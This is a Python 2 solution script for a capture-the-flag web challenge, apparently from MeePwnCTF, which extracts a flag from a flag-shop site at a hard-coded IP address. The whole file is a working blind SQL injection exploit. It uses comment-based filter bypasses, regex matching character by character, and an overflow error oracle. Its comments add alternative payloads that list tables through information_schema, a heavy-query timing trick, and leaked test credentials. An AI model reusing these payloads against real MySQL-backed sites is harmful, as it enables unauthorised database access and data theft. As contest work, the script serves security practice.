import requests
import string
import re


def check_true_false(username,password,num):
	payload = {"username":username,
			   "password":password}
	header = {'Content-Type':'application/x-www-form-urlencoded'}

	content = requests.post(url, headers=header, data=payload).text

	num_1 = int(content.split("<font color='red' size=8 >You have: ")[1].split(" ")[0])
	num_2 = int(num)

	if num_1 == (num_2+1):
		return True
	else:
		return False
"""
<!-- ducnt/__testtest__ -->
<!-- guest/__EGFangay__ -->
<!-- test/__test__ -->
<!-- eesama/hoho@hihi -->
<!-- fightme/123 -->
<!-- sumail/thebest -->
<!-- messi/ronaldo -->
"""
"""
(select/**/count(*)/**/from/**/information_schema.INNODB_BUFFER_PAGE,/**/information_schema.INNODB_BUFFER_PAGE/**/T1) // sleep 1s

"""
"""
0123456789
abcdefghijklmnopqrstuvwxyz
"""
"""
find string : BUYFLAG:ID,BUYFLAG:USERNAME,BUYFLAG:VALUE,FLAGFLAG7847560C748814FD3070E9149A9578BD:FLAG,USERS:ID,USERS:USERNAM
"""
url = 'http://128.199.121.135/index.php'
header = {'Content-Type':'application/x-www-form-urlencoded'}

i = 33

#find = "BUYFLAG:ID,BUY"
#find = "MEEPWNCTF{ALLOME@31337}"

#'/**/&&/**/if((select/**/group_concat(FLAG)/**/from/**/FLAGFLAG7847560C748814FD3070E9149A9578BD)/**/rlike/**/'^MEEPWNCTF{ALLOME@31337}',1,9e307*9e307)/**/like/**/'1
#find = "}73313@EMO"
#MeePwnCTF{ALL_THE_ROADS_LEAD_TO_ROME@31337}
#bit_length
#'/**/&&/**/if((select/**/bit_length(group_concat(FLAG))/**/from/**/FLAGFLAG7847560C748814FD3070E9149A9578BD)/**/rlike/**/'^',1,9e307*9e307)/**/like/**/'1
#find = "}73313@EMO
#MeePwnCTF{all_the_roads_lead_to_rome@31337}
find = 'MEEPW'
username = 'messi'
password = 'ronaldo'
while True:
 	tmp = chr(i)
 	tmp = ('^' + re.escape(find + tmp)).encode('hex')
 	print chr(i) + " : " +tmp
	#payload = "{}'/**/&&/**/if((select/**/group_concat(table_name,0x3a,column_name)/**/from/**/information_schema.columns/**/where/**/table_schema/**/like/**/'flagshop')/**/rlike/**/'^{}',1,9e307*9e307)/**/like/**/'1".format(username, tmp)
	#payload = "{}'/**/&&/**/if((select/**/replace(replace(group_concat(FLAG),x'3d','+'),x'2d','|')/**/from/**/FLAGFLAG7847560C748814FD3070E9149A9578BD)/**/rlike/**/'^{}',1,9e307*9e307)/**/like/**/'1".format(username, tmp)
	#payload = "{}'/**/&&/**/if((select/**/flag/**/from/**/FLAGFLAG7847560C748814FD3070E9149A9578BD)/**/rlike/**/'^{}',1,9e307*9e307)/**/like/**/'1".format(username, tmp)
	#payload = "{}'/**/&&/**/if((select/**/group_concat(FLAG)/**/from/**/FLAGFLAG7847560C748814FD3070E9149A9578BD)/**/rlike/**/0x{},1,9e307*9e307)/**/like/**/'1".format(username, tmp)
	#payload = "{}'/**/&&/**/if((select/**/group_concat(flag)/**/from/**/FLAGFLAG7847560C748814FD3070E9149A9578BD)>'{}',1,9e307*9e307)/**/like/**/'1".format(username, tmp)
	#payload = "messi'/**/&&/**/if('abcd'/**/rlike/**/'^[abcdefghijklmnopqrstuvwxyz]',1,0)/**/like/**/'1"
	payload = "{}'/**/&&/**/if((select/**/flag/**/from/**/FLAGFLAG7847560C748814FD3070E9149A9578BD)/**/rlike/**/0x{},1,9e307*9e307)/**/like/**/'1".format(username, tmp)
	payload = {"username":username,
			   "password":password,
			   "buyflag":payload}
	header = {'Content-Type':'application/x-www-form-urlencoded'}
	content = requests.post(url, headers=header, data=payload).text
	value = content.split("<font color='red' size=8 >You have: ")[1].split(" ")[0]
	#print 'value : ' + value
	if(check_true_false(username, password, value)):
		find = find + chr(i)
		print '==========find=========='
		print 'find string : ' + find
		print '========================'
		i = 33
	else:
		i += 1

